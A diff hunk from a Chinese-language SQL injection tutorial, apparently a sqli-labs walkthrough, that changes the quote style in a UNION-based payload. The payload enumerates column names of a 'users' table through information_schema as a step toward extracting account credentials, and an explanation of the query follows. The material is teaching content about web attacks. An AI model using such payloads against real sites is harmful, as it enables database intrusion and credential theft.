@@ -147,7 +147,7 @@ information_schema.tables表示该数据库下的tables表，点表示下一级;
 5. 注入<code>?id=-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+</code>爆字段名，我们通过sql语句查询知道当前数据库有四个表，根据表名知道可能用户的账户和密码是在users表中。接下来想得到该表下的字段名以及内容。
 
 ~~~ shell
-?id=-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
+?id=-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name="users"--+
 
 该语句意思是查询information_schema数据库下的columns表里table_name字段是users的所有column_name内容。注意table_name字段不是只存在于tables表也存在于columns表中;其实是表示所有字段对应的表名;
 ~~~
